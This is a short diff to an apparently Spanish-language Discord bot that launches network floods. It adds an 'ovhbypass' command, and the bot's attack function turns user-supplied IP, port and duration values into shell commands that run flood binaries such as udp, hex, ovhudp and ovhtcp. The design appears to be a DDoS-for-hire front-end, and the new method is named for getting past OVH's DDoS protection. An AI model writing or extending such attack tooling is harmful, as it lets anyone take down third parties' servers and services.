@@ -116,6 +116,10 @@ async def enviar_mensaje_con_formato(ctx, title, description, color, footer_text
 async def udp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
     await realizar_ataque(ctx, 'udp', ip, port, tiempo)
 
+@bot.command(name='ovhbypass')
+async def ovhbypass_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
+    await realizar_ataque(ctx, 'ovhbypass', ip, port, tiempo)
+
 @bot.command(name='hex')
 async def hex_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
     await realizar_ataque(ctx, 'hex', ip, port, tiempo)
@@ -174,6 +178,8 @@ async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
         comando = f'./hex {ip} {port_int} {tiempo_int}'
     elif metodo == 'udppps':
         comando = f'./udppps {ip} {port_int} {tiempo_int}'
+    elif metodo == 'ovhbypass':
+        comando = f'./ovhbypass {ip} {port_int} {tiempo_int}'
     elif metodo == 'ovhudp':
         comando = f'sudo ./ovhudp {ip} {port_int} 30 -1 {tiempo_int}'
     elif metodo == 'ovhtcp':
